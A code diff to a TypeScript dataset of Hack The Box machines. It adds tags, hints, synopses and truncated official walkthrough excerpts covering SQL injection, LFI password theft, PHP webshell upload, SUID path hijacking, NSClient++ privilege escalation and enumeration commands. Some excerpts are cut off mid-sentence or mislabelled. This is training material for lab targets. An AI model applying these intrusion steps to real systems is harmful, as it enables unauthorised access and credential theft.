+    "officialWalkthrough": "### 📋 Official Synopsis\nAdmirer is an easy difficulty Linux machine that features a vulnerable version of Adminer (caused by an underlying MySQL protocol flaw), and an interesting Python library hijacking vector. After thorough\n\n### 🎯 Core Skills\n- **Exploiting MySQL Arbitrary File Read via Adminer**\n- **Python Library Hijacking**\n\n### 👑 Privilege Escalation\n. Skills Required Basic Web Enumeration Basic Linux Enumeration Skills Learned Exploiting MySQL Arbitrary File Read via Adminer Python Library Hijacking Enumeration Nmap reveals that ports 21 (vsftpd), 22 (OpenSSH) and 80 (Apache) are available. The Nmap script shows that a robots.txt is present, which contains a disallowed entry for /admin-dir . The website features some images. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.168 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.168 We're not permitted to access the /admin-dir directory, and the website source code doesn't reveal anything interesting."
   },
   {
     "id": "htb-quick",
@@ -8019,15 +9349,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "ESI-Injection",
+      "HTB",
+      "HTTP/3-Protocol",
+      "Using-Symlinks"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/quick",
     "writeupUrl": "https://0xdf.gitlab.io/tags#quick",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Quick is a hard difficulty Linux machine that features a website running on the HTTP/3 protocol.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-04-25T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Quick is a hard difficulty Linux machine that features a website running on the HTTP/3 protocol.",
+    "skillsLearned": [
+      "HTTP/3 Protocol",
+      "Using Symlinks",
+      "ESI Injection"
+    ],
+    "officialPdf": "244-Quick_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nQuick is a hard difficulty Linux machine that features a website running on the HTTP/3 protocol.\n\n### 🎯 Core Skills\n- **HTTP/3 Protocol**\n- **Using Symlinks**\n- **ESI Injection**\n\n### ⚔️ Foothold Vector\n. A weak password gives access to a printer console, which permits the addition of new printers. Weak file permissions are exploited to move laterally. Plaintext credentials exposed in a configuration are reused to escalate to\n\n### 👑 Privilege Escalation\n. Skills Required Web Enumeration Bash Scripting Skills Learned HTTP/3 Protocol Using Symlinks ESI Injection Enumeration Nmap Nmap reveals port 9001 running Apache as well as SSH running on its default port. Apache The website on port 9001 displays information about the broadband service. The page contains a hyperlink pointing to portal.quick.htb , stating that it supports the latest TLS and HTTP implementations. The latest TLS and HTTP versions are TLSv1.3 and HTTP/3 respectively. Let's add the following entries to the hosts file for further enumeration. The page also contains some testimonials from clients at the bottom. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-magic",
@@ -8038,15 +9379,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Basic-SQL-Injection",
+      "HTB",
+      "Path-Hijacking",
+      "SUID-Abuse"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/magic",
     "writeupUrl": "https://0xdf.gitlab.io/tags#magic",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Magic is an easy difficulty Linux machine that features a custom web application. A SQL injection vulnerability in the login form is exploited, in order to bypass the login and gain access to an upload page.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-04-18T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Magic is an easy difficulty Linux machine that features a custom web application. A SQL injection vulnerability in the login form is exploited, in order to bypass the login and gain access to an upload page. Weak whitelist validation allows for uploading a PHP webshell, which is used to gain command execution. The MySQL database is found to contain plaintext credentials, which are re- used for lateral movement. A path hijacking vector combined with assigned SUID permissions leads to full system compromise.",
+    "skillsLearned": [
+      "Basic SQL Injection",
+      "PHP File Upload Whitelist Bypass",
+      "Path Hijacking",
+      "SUID Abuse"
+    ],
+    "officialPdf": "241-Magic_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nMagic is an easy difficulty Linux machine that features a custom web application. A SQL injection vulnerability in the login form is exploited, in order to bypass the login and gain access to an upload page. Weak whitelist validation allows for uploading a PHP webshell, which is used to gain command execution. The MySQL database is found to contain plaintext credentials, which are re- used for lateral movement. A path hijacking vector combined with assigned SUID permissions leads to full system compromise.\n\n### 🎯 Core Skills\n- **Basic SQL Injection**\n- **PHP File Upload Whitelist Bypass**\n- **Path Hijacking**\n- **SUID Abuse**\n\n### ⚔️ Foothold Vector\nWe can try to upload a PHP reverse shell, but this is unsuccessful as we find that the website only permits specific file types. It seems that the application logic checks if the file that is being uploaded has a jpeg , jpg or png extension. According to the Apache Documentation, files can have more than one extension while the order is normally irrelevant. When a file with multiple extensions gets associated with both a media-type and a handler, it will result in the request being handled by the module associated with the handler. For example, let's say that we have the file test.php.jpg with the .php extension mapped to the handler application/x-httpd-php , and the .\n\n### 👑 Privilege Escalation\nThe following command can be used to enumerate SUID files on the box. This reveals the interesting binary /bin/sysinfo . The SUID bit s ensures that the program is run with root privileges. Executing the binary returns system information, which low-privileged users don't usually have access to. The strings command can be used to list printable strings contained in the binary. This reveals the commands it invokes in order to retrieve system information. find / -perm -4000 -exec ls -l {} \\; 2>/dev/null strings /bin/sysinfo Looking at the CPU Info section, the program is seen to use cat /proc/cpuinfo instead of /bin/cat /proc/cpuinfo ."
   },
   {
     "id": "htb-servmon",
@@ -8057,15 +9410,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "1000",
+      "Exploiting-NSClient++",
+      "Exploiting-NVMS",
+      "HTB",
+      "SSH-Password-Spraying"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/servmon",
     "writeupUrl": "https://0xdf.gitlab.io/tags#servmon",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000 (Network Surveillance Management Software) instance. This is found to be vulnerable to LFI, which is used to read a list of passwords on a user's desktop.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-04-11T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000 (Network Surveillance Management Software) instance. This is found to be vulnerable to LFI, which is used to read a list of passwords on a user's desktop. Using the credentials, we can SSH to the server as a second user. As this low-privileged user, it's possible enumerate the system and find the password for NSClient++ (a system monitoring agent). After creating an SSH tunnel, we can access the NSClient++ web app.",
+    "skillsLearned": [
+      "Exploiting NVMS",
+      "1000",
+      "Exploiting NSClient++",
+      "SSH Password Spraying"
+    ],
+    "officialPdf": "240-ServMon_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000 (Network Surveillance Management Software) instance. This is found to be vulnerable to LFI, which is used to read a list of passwords on a user's desktop. Using the credentials, we can SSH to the server as a second user. As this low-privileged user, it's possible enumerate the system and find the password for NSClient++ (a system monitoring agent). After creating an SSH tunnel, we can access the NSClient++ web app.\n\n### 🎯 Core Skills\n- **Exploiting NVMS**\n- **1000**\n- **Exploiting NSClient++**\n- **SSH Password Spraying**\n\n### ⚔️ Foothold Vector\nNVMS Searching on Exploit-DB for the NVMS software returns Local File Inclusion exploit assigned CVE- 2019-20085. Configure the browser to use Burp as a proxy, refresh the NVMS-1000 web page and intercept the request. Hit CTRL + R to send the request to Burp's Repeater module. Substitute the GET request on the first line with the payload below. The file win.ini exists in on Windows installations and is readable by all users, and so is a good target for verifying a LFI. The win.ini file is displayed, which validates the vulnerability. Using the information from the FTP server let's try to open C:\\Users\\Nathan\\Desktop\\Passwords.txt . This works and a password list is returned.\n\n### 👑 Privilege Escalation\nEnumeration Enumerating of the filesystem reveals the non-default directory C:\\Program Files\\NSClient++\\ . The .ini file for NSClient is found inside. Let's read it. We can also identify the version with the command: We have gained the password for the web app, and know that localhost is the only whitelisted entry. Researching NSClient online we come upon this privilege escalation technique, involving feature abuse. The software version mentioned in this procedure is 0.5.2.35 . The following command reveals that the same software version is installed on the box. cmd /c \"C:\\Program Files\\NSClient++\\nscp.exe\" web -- password --display cmd /c \"C:\\Program Files\\NSClient++\\nscp."
   },
   {
     "id": "htb-forwardslash",
@@ -8076,15 +9442,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Bash-Scripting",
+      "Blind-XXE",
+      "HTB",
+      "Pivoting"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/forwardslash",
     "writeupUrl": "https://0xdf.gitlab.io/tags#forwardslash",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "ForwardSlash is a hard Linux machine featuring a compromised server. Through directory busting it is possible to identify a virtual host that points to a backup instance of the website.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-04-04T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "ForwardSlash is a hard Linux machine featuring a compromised server. Through directory busting it is possible to identify a virtual host that points to a backup instance of the website. After registering a new account, an LFI vulnerability is identified through a disabled HTML form. The LFI vulnerability can be used to access the dev endpoint, which only allows local connections. The dev page accepts XML input and an XXE vulnerability is identified. Successful exploitation of the vulnerability leads to the disclosure of FTP credentials for the user chiv .",
+    "skillsLearned": [
+      "Pivoting",
+      "Blind XXE",
+      "Bash Scripting",
+      "Attacking Custom Cryptography using Python",
+      "LUKS Image Mounting and Decryption"
+    ],
+    "officialPdf": "239-ForwardSlash_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nForwardSlash is a hard Linux machine featuring a compromised server. Through directory busting it is possible to identify a virtual host that points to a backup instance of the website. After registering a new account, an LFI vulnerability is identified through a disabled HTML form. The LFI vulnerability can be used to access the dev endpoint, which only allows local connections. The dev page accepts XML input and an XXE vulnerability is identified. Successful exploitation of the vulnerability leads to the disclosure of FTP credentials for the user chiv .\n\n### 🎯 Core Skills\n- **Pivoting**\n- **Blind XXE**\n- **Bash Scripting**\n- **Attacking Custom Cryptography using Python**\n- **LUKS Image Mounting and Decryption**\n\n### ⚔️ Foothold Vector\nof the vulnerability leads to the disclosure of FTP credentials for the user chiv . As the credentials have been reused for SSH, it is possible to gain a foothold on the server. A SUID binary is found that attempts to read files whose name is the MD5 hash of the time the binary is run. A symbolic link is created that points to a backup of a PHP configuration, leading to disclosure of credentials for the user pain . These new credentials also work with SSH, and the user flag is acquired. Finally a cipher text is found in the user's home directory along with the code used to encrypt it. Upon successful creation of a decryption script, a password is revealed.\n\n### 👑 Privilege Escalation\naccount. Skills Required Virtual Host Enumeration System Enumeration Python Scripting Skills Learned Pivoting Blind XXE Bash Scripting Attacking Custom Cryptography using Python LUKS Image Mounting and Decryption Enumeration Let's begin by running an Nmap scan. The scan reveals ports 80 (Apache) and 22 (SSH) to be open. Navigating to port 80 using a web browser we are immediately redirected to the host forwardslash.htb . Let's add this to our hosts file in order to access the website. Refresh the web page and it should load. The web page seems to have been hacked by a group called the Backslash Gang . The defaced message hints to XML and Automatic FTP Logins being in use."
   },
   {
     "id": "htb-remote",
@@ -8095,15 +9474,19 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "CVE-2019-18988",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/remote",
     "writeupUrl": "https://0xdf.gitlab.io/tags#remote",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Remote is an easy difficulty Windows machine that features an Umbraco CMS installation. Credentials are found in a world-readable NFS share.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-03-21T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Remote is an easy difficulty Windows machine that features an Umbraco CMS installation. Credentials are found in a world-readable NFS share. Using these, an authenticated Umbraco CMS exploit is leveraged to gain a foothold. A vulnerable TeamViewer version is identified, from which we can gain a password. This password has been reused with the local administrator account. Using psexec with these credentials returns a SYSTEM shell.",
+    "officialPdf": "234-Remote_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRemote is an easy difficulty Windows machine that features an Umbraco CMS installation. Credentials are found in a world-readable NFS share. Using these, an authenticated Umbraco CMS exploit is leveraged to gain a foothold. A vulnerable TeamViewer version is identified, from which we can gain a password. This password has been reused with the local administrator account. Using psexec with these credentials returns a SYSTEM shell.\n\n### 🛡️ Associated CVEs\n`CVE-2019-18988`\n\n### ⚔️ Foothold Vector\n. A vulnerable TeamViewer version is identified, from which we can gain a password. This password has been reused with the local administrator account. Using psexec with these credentials returns a SYSTEM shell. Skills Required Enumeration Skills Learned NFS Enumeration CMS Exploitation TeamViewer Credential Gathering SeImpersonate Privilege Abuse Enumeration Nmap Nmap reveals that the target host is a Windows system that features a web server, FTP, SMB and NFS services running on their default ports. It is also revealed that the FTP service permits anonymous access. FTP Let's login to FTP with the credentials anonymous / anonymous . nmap -A -p- --min-rate=1000 -T4 10.10.10.\n\n### 👑 Privilege Escalation\n/ password failed. gobuster dir --url=http://10.10.10.180/ --wordlist=/usr/share/wordlists/dirb/common.txt NFS Available shares on Network File System can be enumerated using showmount utility. Let's install it by issuing the command below. We can now enumerate directories that are exported on NFS. The site_backups folder is accessible to everyone. Let's mount this folder on our machine. Listing this reveals an Umbraco subdirectory. sudo apt install nfs-common showmount -e 10.10.10.180 mkdir backups sudo mount -t nfs 10.10.10.180:/site_backups backups/ Reading about Umbraco credential files online reveals that credentials are stored in the file Umbraco.sdf within the App_Data folder."
   },
   {
     "id": "htb-traceback",
@@ -8114,15 +9497,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "SSH-Motd-Editing"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/traceback",
     "writeupUrl": "https://0xdf.gitlab.io/tags#traceback",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Traceback is an easy difficulty machine that features an Apache web server. A PHP web shell uploaded by a hacker is accessible and can be used to gain command execution in the context of the webadmin user.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-03-14T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Traceback is an easy difficulty machine that features an Apache web server. A PHP web shell uploaded by a hacker is accessible and can be used to gain command execution in the context of the webadmin user. This user has the privilege to run a tool called luvit , which executes Lua code as the sysadmin user. Finally, the Sysadmin user has write permissions to the update-motd file. This file is run as root every time someone connects to the machine through SSH. This is used to escalate privileges to root.",
+    "skillsLearned": [
+      "SSH Motd Editing"
+    ],
+    "officialPdf": "233-Traceback_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTraceback is an easy difficulty machine that features an Apache web server. A PHP web shell uploaded by a hacker is accessible and can be used to gain command execution in the context of the webadmin user. This user has the privilege to run a tool called luvit , which executes Lua code as the sysadmin user. Finally, the Sysadmin user has write permissions to the update-motd file. This file is run as root every time someone connects to the machine through SSH. This is used to escalate privileges to root.\n\n### 🎯 Core Skills\n- **SSH Motd Editing**\n\n### ⚔️ Foothold Vector\nSearching for the above HTML comment bring us to this GitHub repo, which contains various well known web shells. In order to test which ones exist, we can navigate to Find File on GitHub, copy the file names and paste them in a text file. We can then use gobuster to see if any of them exist. We find that smevk.php does exist. The web shell requires a username and a password in order to access it. Examination of the webshell source reveals that the default credentials are admin : admin . This works and we now have access to the shell. alfa3.php alfav3.0.1.php andela.php bloodsecv4.php by.php c99ud.php cmd.php configkillerionkros.php jspshell.jsp mini.php obfuscated-punknopass.php punk-nopass.\n\n### 👑 Privilege Escalation\nevery time someone connects to the machine through SSH. This is used to escalate privileges to root. Skills Required Enumeration Lua coding Skills Learned SSH Motd Editing Enumeration The scan reveals that SSH and Apache are available on their default ports. There is a website with the title Help us , let's check it out in a web browser. The website has been hacked, and the message refers to a backdoor being present. Viewing the source code of the page we can see the following comment. So it seems the hacker has left a web shell on the website. We also run a GoBuster scan, but this doesn't reveal any interesting files. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-multimaster",
@@ -8133,15 +9523,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2020-1472",
+      "HTB",
+      "Password-Cracking",
+      "SQL-Injection",
+      "VS-Code"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/multimaster",
     "writeupUrl": "https://0xdf.gitlab.io/tags#multimaster",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Multimaster is an insane difficulty Windows machine featuring a web application that is vulnerable to SQL Injection. This vulnerability is leveraged to obtain the foothold on the server.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-03-07T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Multimaster is an insane difficulty Windows machine featuring a web application that is vulnerable to SQL Injection. This vulnerability is leveraged to obtain the foothold on the server. Examination the file system reveals that a vulnerable version of VS Code is installed, and VS Code processes and found to be running on the server. By exploiting debug functionality, a shell as the user cyork can be gained. A password is found in a DLL, which due to password reuse, results in a shell as sbauer . This user is found to have GenericWrite permissions on the user jorden .",
+    "skillsLearned": [
+      "SQL Injection",
+      "Password Cracking",
+      "VS Code"
+    ],
+    "officialPdf": "232-Multimaster_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nMultimaster is an insane difficulty Windows machine featuring a web application that is vulnerable to SQL Injection. This vulnerability is leveraged to obtain the foothold on the server. Examination the file system reveals that a vulnerable version of VS Code is installed, and VS Code processes and found to be running on the server. By exploiting debug functionality, a shell as the user cyork can be gained. A password is found in a DLL, which due to password reuse, results in a shell as sbauer . This user is found to have GenericWrite permissions on the user jorden .\n\n### 🎯 Core Skills\n- **SQL Injection**\n- **Password Cracking**\n- **VS Code**\n\n### 🛡️ Associated CVEs\n`CVE-2020-1472`\n\n### ⚔️ Foothold Vector\non the server. Examination the file system reveals that a vulnerable version of VS Code is installed, and VS Code processes and found to be running on the server. By exploiting debug functionality, a shell as the user cyork can be gained. A password is found in a DLL, which due to password reuse, results in a shell as sbauer . This user is found to have GenericWrite permissions on the user jorden . Abusing this privilege allows us to gain access to the server as this user. jorden is be member of Server Operators group, whose privileges we exploit to get a SYSTEM shell.\n\n### 👑 Privilege Escalation\nBloodHound We can use Bloodhound to enumerate and visualise the Active Directory domain, and identify possible attack chains that will allow us to elevate our domain privileges. The bloodhound-python ingestor can be used to remotely collect data from Active Directory. Then, we can run bloodhound to visualise any available attack paths. First, start the neo4j server, login the the URL provided, and set the password. Then type bloodhound to access the BloodHound UI, and log in with the neo4j credentials. When bloodhound-python completes, compress the files into a zip and upload it."
   },
   {
     "id": "htb-oouch",
@@ -8152,15 +9554,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "OAuth"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/oouch",
     "writeupUrl": "https://0xdf.gitlab.io/tags#oouch",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Oouch is a hard difficulty Linux machine featuring web applications that use the OAuth authorization framework. Absence of a CSRF Token is leveraged to link an administrative account to our account, providing access to sensitive information.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-02-29T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Oouch is a hard difficulty Linux machine featuring web applications that use the OAuth authorization framework. Absence of a CSRF Token is leveraged to link an administrative account to our account, providing access to sensitive information. This information is used to register a new client application and steal the authorization code. This code is used to gain an access token, which provides unrestricted access to user resources. A misconfigured DBus server is then exploited through uWSGI in order to execute code in the context of root.",
+    "skillsLearned": [
+      "OAuth"
+    ],
+    "officialPdf": "231-Oouch_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOouch is a hard difficulty Linux machine featuring web applications that use the OAuth authorization framework. Absence of a CSRF Token is leveraged to link an administrative account to our account, providing access to sensitive information. This information is used to register a new client application and steal the authorization code. This code is used to gain an access token, which provides unrestricted access to user resources. A misconfigured DBus server is then exploited through uWSGI in order to execute code in the context of root.\n\n### 🎯 Core Skills\n- **OAuth**\n\n### ⚔️ Foothold Vector\nScripting Skills Learned OAuth Exploitation DBus uWSGI Protocol Enumeration Nmap Nmap reveals four open ports, FTP (21) with anonymous login enabled, SSH (22), Nginx (5000) and another HTTP server on port 8000. FTP Let's enumerate any files and folders present on the FTP server. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.177 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.177 Logging in as the anonymous user gives us access to a file named project.txt , which is downloaded. Here are the contents of the file: The file doesn't contain much information, but it provides us with the two terms Consumer and Authorization Server .\n\n### 👑 Privilege Escalation\n. Skills Required Web Enumeration CSRF Exploitation Scripting Skills Learned OAuth Exploitation DBus uWSGI Protocol Enumeration Nmap Nmap reveals four open ports, FTP (21) with anonymous login enabled, SSH (22), Nginx (5000) and another HTTP server on port 8000. FTP Let's enumerate any files and folders present on the FTP server. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.177 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.177 Logging in as the anonymous user gives us access to a file named project.txt , which is downloaded."
   },
   {
     "id": "htb-book",
@@ -8171,15 +9580,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Logrotate",
+      "SQL-Truncation"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/book",
     "writeupUrl": "https://0xdf.gitlab.io/tags#book",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Book is a medium difficulty Linux machine hosting a Library application. It allows users to sign up and add books, as well as provide feedback.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-02-22T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Book is a medium difficulty Linux machine hosting a Library application. It allows users to sign up and add books, as well as provide feedback. The back-end database is found to be vulnerable to SQL truncation, which is leveraged to register an account as admin and escalate privileges. The admin panel contains additional functionality to export PDFs, which is exploited through XSS to gain SSH access. Finally, misconfigured logs are exploited to get root.",
+    "skillsLearned": [
+      "SQL Truncation",
+      "Logrotate"
+    ],
+    "officialPdf": "230-Book_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBook is a medium difficulty Linux machine hosting a Library application. It allows users to sign up and add books, as well as provide feedback. The back-end database is found to be vulnerable to SQL truncation, which is leveraged to register an account as admin and escalate privileges. The admin panel contains additional functionality to export PDFs, which is exploited through XSS to gain SSH access. Finally, misconfigured logs are exploited to get root.\n\n### 🎯 Core Skills\n- **SQL Truncation**\n- **Logrotate**\n\n### ⚔️ Foothold Vector\nEnumeration Nmap Nmap reveals two open ports running HTTP and SSH respectively. Apache Browsing to port 80 returns a sign-up and login form. Clicking on Sign Up without any input results in the following pop-up. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.176 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.176 The page asks us to register usernames with less than 10 characters only. Similarly, an empty email field prompts us to enter an address of less than 20 characters in length. Gobuster Let's run Gobuster to find any hidden folders. The /docs folder returns a 403 forbidden error. However, the admin folder hosts an admin login form.\n\n### 👑 Privilege Escalation\n. Skills Required Web Enumeration JavaScript Skills Learned SQL Truncation XSS Logrotate Exploitation Enumeration Nmap Nmap reveals two open ports running HTTP and SSH respectively. Apache Browsing to port 80 returns a sign-up and login form. Clicking on Sign Up without any input results in the following pop-up. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.176 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.176 The page asks us to register usernames with less than 10 characters only. Similarly, an empty email field prompts us to enter an address of less than 20 characters in length. Gobuster Let's run Gobuster to find any hidden folders."
   },
   {
     "id": "htb-fatty",
@@ -8190,15 +9608,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Deserialization",
+      "HTB",
+      "Path-Traversal",
+      "SQL-Injection",
+      "Thick-Client-Pentesting"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/fatty",
     "writeupUrl": "https://0xdf.gitlab.io/tags#fatty",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Fatty is an insane difficulty Linux machine featuring a three-tier client-server architecture that has multiple vulnerabilities. Modification of the client application allows for a path traversal, which is used to download the server application.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-02-08T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Fatty is an insane difficulty Linux machine featuring a three-tier client-server architecture that has multiple vulnerabilities. Modification of the client application allows for a path traversal, which is used to download the server application. Admin access can be obtained by exploiting a SQL injection vulnerability in the login function. Exploiting a deserialization vulnerability in the change password function provides a foothold. A root shell can be gained by exploiting the cronjob.",
+    "skillsLearned": [
+      "Thick Client Pentesting",
+      "Path Traversal",
+      "SQL Injection",
+      "Deserialization"
+    ],
+    "officialPdf": "227-Fatty_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFatty is an insane difficulty Linux machine featuring a three-tier client-server architecture that has multiple vulnerabilities. Modification of the client application allows for a path traversal, which is used to download the server application. Admin access can be obtained by exploiting a SQL injection vulnerability in the login function. Exploiting a deserialization vulnerability in the change password function provides a foothold. A root shell can be gained by exploiting the cronjob.\n\n### 🎯 Core Skills\n- **Thick Client Pentesting**\n- **Path Traversal**\n- **SQL Injection**\n- **Deserialization**\n\n### 👑 Privilege Escalation\nshell can be gained by exploiting the cronjob. Skills Required Java Programming OWASP Top 10 Skills Learned Thick Client Pentesting Path Traversal SQL Injection Deserialization Tar Exploitation Enumeration Nmap Nmap reveals that the target server has ports 21 (vsftpd), 22 (OpenSSH), 1337 (ssl/waste), 1338 (ssl/wmc-log-svc) and 1339 (ssl/kjtsiteserver) open. FTP The output also reveals that the FTP service permits anonymous authentication. Let's try to login to the FTP server as the anonymous user. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.174 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10."
   },
   {
     "id": "htb-nest",
@@ -8209,15 +9640,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      ".NET-Development",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/nest",
     "writeupUrl": "https://0xdf.gitlab.io/tags#nest",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Nest is an easy difficulty Windows machine featuring an SMB server that permits guest access. The shares can be enumerated to gain credentials for a low privileged user.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-01-25T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Nest is an easy difficulty Windows machine featuring an SMB server that permits guest access. The shares can be enumerated to gain credentials for a low privileged user. This user is found to have access to configuration files containing sensitive information. Another user's password is found through source code analysis, which is used to gain a foothold on the box. A custom service is found to be running, which is enumerated to find and decrypt Administrator credentials.",
+    "skillsLearned": [
+      ".NET Development"
+    ],
+    "officialPdf": "225-Nest_HTB_Official_writeup_Tamarisk.pdf",
